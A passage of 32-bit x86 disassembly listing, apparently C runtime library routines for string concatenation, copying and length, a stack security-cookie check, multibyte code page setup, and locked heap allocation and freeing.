  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
  425ba0:	stos   DWORD PTR es:[edi],eax
  425ba1:	stos   DWORD PTR es:[edi],eax
  425ba2:	pop    edi
  425ba3:	ret    
  425ba4:	push   ebp
  425ba5:	mov    ebp,esp
  425ba7:	sub    esp,0x518
  425bad:	mov    eax,ds:0x462f30
  425bb2:	xor    eax,DWORD PTR [ebp+0x4]
  425bb5:	push   esi
  425bb6:	mov    DWORD PTR [ebp-0x4],eax
  425bb9:	lea    eax,[ebp-0x18]
  425bbc:	push   eax
  425bbd:	push   DWORD PTR ds:0x463b24
  425bc3:	call   DWORD PTR ds:0x429104
  425bc9:	cmp    eax,0x1
  425bcc:	mov    esi,0x100
  425bd1:	jne    0x425ce4
  425bd7:	xor    eax,eax
  425bd9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425be0:	inc    eax
  425be1:	cmp    eax,esi
  425be3:	jb     0x425bd9
  425be5:	mov    al,BYTE PTR [ebp-0x12]
  425be8:	test   al,al
  425bea:	mov    BYTE PTR [ebp-0x118],0x20
  425bf1:	je     0x425c29
  425bf3:	push   ebx
  425bf4:	lea    edx,[ebp-0x11]
  425bf7:	push   edi
  425bf8:	movzx  ecx,BYTE PTR [edx]
  425bfb:	movzx  eax,al
  425bfe:	cmp    eax,ecx
  425c00:	ja     0x425c1f
  425c02:	sub    ecx,eax
  425c04:	inc    ecx
  425c05:	mov    ebx,ecx
  425c07:	shr    ecx,0x2
  425c0a:	lea    edi,[ebp+eax*1-0x118]
  425c11:	mov    eax,0x20202020
  425c16:	rep stos DWORD PTR es:[edi],eax
  425c18:	mov    ecx,ebx
  425c1a:	and    ecx,0x3
  425c1d:	rep stos BYTE PTR es:[edi],al
  425c1f:	inc    edx
  425c20:	mov    al,BYTE PTR [edx]
  425c22:	inc    edx
  425c23:	test   al,al
  425c25:	jne    0x425bf8
  425c27:	pop    edi
  425c28:	pop    ebx
  425c29:	push   0x0
  425c2b:	push   DWORD PTR ds:0x463a14
  425c31:	lea    eax,[ebp-0x518]
  425c37:	push   DWORD PTR ds:0x463b24
  425c3d:	push   eax
  425c3e:	push   esi
  425c3f:	lea    eax,[ebp-0x118]
  425c45:	push   eax
  425c46:	push   0x1
  425c48:	call   0x427b58
  425c4d:	push   0x0
  425c4f:	push   DWORD PTR ds:0x463b24
  425c55:	lea    eax,[ebp-0x218]
  425c5b:	push   esi
  425c5c:	push   eax
  425c5d:	push   esi
  425c5e:	lea    eax,[ebp-0x118]
  425c64:	push   eax
  425c65:	push   esi
  425c66:	push   DWORD PTR ds:0x463a14
  425c6c:	call   0x42779c
  425c71:	push   0x0
  425c73:	push   DWORD PTR ds:0x463b24
  425c79:	lea    eax,[ebp-0x318]
  425c7f:	push   esi
  425c80:	push   eax
  425c81:	push   esi
  425c82:	lea    eax,[ebp-0x118]
  425c88:	push   eax
  425c89:	push   0x200
  425c8e:	push   DWORD PTR ds:0x463a14
  425c94:	call   0x42779c
  425c99:	add    esp,0x5c
  425c9c:	xor    eax,eax
  425c9e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425ca6:	test   cl,0x1
  425ca9:	je     0x425cc1
  425cab:	or     BYTE PTR [eax+0x463a21],0x10
  425cb2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425cb9:	mov    BYTE PTR [eax+0x463b40],cl
  425cbf:	jmp    0x425cdd
  425cc1:	test   cl,0x2
  425cc4:	je     0x425cd6
  425cc6:	or     BYTE PTR [eax+0x463a21],0x20
  425ccd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425cd4:	jmp    0x425cb9
  425cd6:	and    BYTE PTR [eax+0x463b40],0x0
  425cdd:	inc    eax
  425cde:	cmp    eax,esi
  425ce0:	jb     0x425c9e
  425ce2:	jmp    0x425d28
  425ce4:	xor    eax,eax
  425ce6:	cmp    eax,0x41
  425ce9:	jb     0x425d04
  425ceb:	cmp    eax,0x5a
  425cee:	ja     0x425d04
  425cf0:	or     BYTE PTR [eax+0x463a21],0x10
  425cf7:	mov    cl,al
  425cf9:	add    cl,0x20
  425cfc:	mov    BYTE PTR [eax+0x463b40],cl
  425d02:	jmp    0x425d23
  425d04:	cmp    eax,0x61
  425d07:	jb     0x425d1c
  425d09:	cmp    eax,0x7a
  425d0c:	ja     0x425d1c
  425d0e:	or     BYTE PTR [eax+0x463a21],0x20
  425d15:	mov    cl,al
  425d17:	sub    cl,0x20
  425d1a:	jmp    0x425cfc
  425d1c:	and    BYTE PTR [eax+0x463b40],0x0
  425d23:	inc    eax
  425d24:	cmp    eax,esi
  425d26:	jb     0x425ce6
  425d28:	mov    ecx,DWORD PTR [ebp-0x4]
  425d2b:	xor    ecx,DWORD PTR [ebp+0x4]
  425d2e:	pop    esi
  425d2f:	call   0x425afc
  425d34:	leave  
  425d35:	ret    
  425d36:	push   ebp
  425d37:	mov    ebp,esp
  425d39:	sub    esp,0x1c
  425d3c:	mov    eax,ds:0x462f30
  425d41:	xor    eax,DWORD PTR [ebp+0x4]
  425d44:	push   ebx
  425d45:	push   esi
  425d46:	mov    esi,DWORD PTR [ebp+0x8]
  425d49:	xor    ebx,ebx
  425d4b:	cmp    esi,ebx
  425d4d:	mov    DWORD PTR [ebp-0x4],eax
  425d50:	push   edi
  425d51:	je     0x425eab
  425d57:	xor    edx,edx
  425d59:	xor    eax,eax
  425d5b:	cmp    DWORD PTR [eax+0x462f40],esi
  425d61:	je     0x425dc8
  425d63:	add    eax,0x30
  425d66:	inc    edx
  425d67:	cmp    eax,0xf0
  425d6c:	jb     0x425d5b
  425d6e:	lea    eax,[ebp-0x1c]
  425d71:	push   eax
  425d72:	push   esi
  425d73:	call   DWORD PTR ds:0x429104
  425d79:	cmp    eax,0x1
  425d7c:	jne    0x425ea3
  425d82:	push   0x40
  425d84:	xor    eax,eax
  425d86:	cmp    DWORD PTR [ebp-0x1c],0x1
  425d8a:	pop    ecx
  425d8b:	mov    edi,0x463a20
  425d90:	rep stos DWORD PTR es:[edi],eax
  425d92:	stos   BYTE PTR es:[edi],al
  425d93:	mov    DWORD PTR ds:0x463b24,esi
  425d99:	mov    DWORD PTR ds:0x463a14,ebx
  425d9f:	jbe    0x425e91
  425da5:	cmp    BYTE PTR [ebp-0x16],0x0
  425da9:	je     0x425e69
  425daf:	lea    ecx,[ebp-0x15]
  425db2:	mov    dl,BYTE PTR [ecx]
  425db4:	test   dl,dl
  425db6:	je     0x425e69
  425dbc:	movzx  eax,BYTE PTR [ecx-0x1]
  425dc0:	movzx  edx,dl
  425dc3:	jmp    0x425e59
  425dc8:	push   0x40
  425dca:	xor    eax,eax
  425dcc:	pop    ecx
  425dcd:	mov    edi,0x463a20
  425dd2:	rep stos DWORD PTR es:[edi],eax
  425dd4:	lea    ecx,[edx+edx*2]
  425dd7:	shl    ecx,0x4
  425dda:	mov    DWORD PTR [ebp-0x8],ebx
  425ddd:	stos   BYTE PTR es:[edi],al
  425dde:	lea    ebx,[ecx+0x462f50]
  425de4:	mov    al,BYTE PTR [ebx]
  425de6:	mov    esi,ebx
  425de8:	jmp    0x425e13
  425dea:	mov    dl,BYTE PTR [esi+0x1]
  425ded:	test   dl,dl
  425def:	je     0x425e17
  425df1:	movzx  eax,al
  425df4:	movzx  edi,dl
  425df7:	cmp    eax,edi
  425df9:	ja     0x425e0f
  425dfb:	mov    edx,DWORD PTR [ebp-0x8]
  425dfe:	mov    dl,BYTE PTR [edx+0x462f38]
  425e04:	or     BYTE PTR [eax+0x463a21],dl
  425e0a:	inc    eax
  425e0b:	cmp    eax,edi
  425e0d:	jbe    0x425e04
  425e0f:	inc    esi
  425e10:	inc    esi
  425e11:	mov    al,BYTE PTR [esi]
  425e13:	test   al,al
  425e15:	jne    0x425dea
  425e17:	inc    DWORD PTR [ebp-0x8]
  425e1a:	add    ebx,0x8
  425e1d:	cmp    DWORD PTR [ebp-0x8],0x4
  425e21:	jb     0x425de4
  425e23:	mov    eax,DWORD PTR [ebp+0x8]
  425e26:	mov    ds:0x463b24,eax
  425e2b:	mov    DWORD PTR ds:0x463a1c,0x1
  425e35:	call   0x425b4c
  425e3a:	lea    ecx,[ecx+0x462f44]
  425e40:	mov    esi,ecx
  425e42:	mov    edi,0x463b30
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e49:	mov    ds:0x463a14,eax
  425e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4f:	jmp    0x425eb0
  425e51:	or     BYTE PTR [eax+0x463a21],0x4
  425e58:	inc    eax
  425e59:	cmp    eax,edx
  425e5b:	jbe    0x425e51
  425e5d:	inc    ecx
  425e5e:	inc    ecx
  425e5f:	cmp    BYTE PTR [ecx-0x1],0x0
  425e63:	jne    0x425db2
  425e69:	xor    ecx,ecx
  425e6b:	inc    ecx
  425e6c:	mov    eax,ecx
  425e6e:	or     BYTE PTR [eax+0x463a21],0x8
  425e75:	inc    eax
  425e76:	cmp    eax,0xff
  425e7b:	jb     0x425e6e
  425e7d:	mov    eax,esi
  425e7f:	call   0x425b4c
  425e84:	mov    ds:0x463a14,eax
  425e89:	mov    DWORD PTR ds:0x463a1c,ecx
  425e8f:	jmp    0x425e97
  425e91:	mov    DWORD PTR ds:0x463a1c,ebx
  425e97:	xor    eax,eax
  425e99:	mov    edi,0x463b30
  425e9e:	stos   DWORD PTR es:[edi],eax
  425e9f:	stos   DWORD PTR es:[edi],eax
  425ea0:	stos   DWORD PTR es:[edi],eax
  425ea1:	jmp    0x425eb0
  425ea3:	cmp    DWORD PTR ds:0x463884,ebx
  425ea9:	je     0x425eb9
  425eab:	call   0x425b7b
  425eb0:	call   0x425ba4
  425eb5:	xor    eax,eax
  425eb7:	jmp    0x425ebc
  425eb9:	or     eax,0xffffffff
  425ebc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ebf:	xor    ecx,DWORD PTR [ebp+0x4]
  425ec2:	pop    edi
  425ec3:	pop    esi
  425ec4:	pop    ebx
  425ec5:	call   0x425afc
  425eca:	leave  
  425ecb:	ret    
  425ecc:	push   0x14
  425ece:	push   0x4296a8
  425ed3:	call   0x425434
  425ed8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425edc:	push   0xd
  425ede:	call   0x4255ef
  425ee3:	pop    ecx
  425ee4:	xor    edi,edi
  425ee6:	mov    DWORD PTR [ebp-0x4],edi
  425ee9:	mov    DWORD PTR ds:0x463884,edi
  425eef:	mov    eax,DWORD PTR [ebp+0x8]
  425ef2:	cmp    eax,0xfffffffe
  425ef5:	jne    0x425f09
  425ef7:	mov    DWORD PTR ds:0x463884,0x1
  425f01:	call   DWORD PTR ds:0x429100
  425f07:	jmp    0x425f34
  425f09:	cmp    eax,0xfffffffd
  425f0c:	jne    0x425f20
  425f0e:	mov    DWORD PTR ds:0x463884,0x1
  425f18:	call   DWORD PTR ds:0x4290fc
  425f1e:	jmp    0x425f34
  425f20:	cmp    eax,0xfffffffc
  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
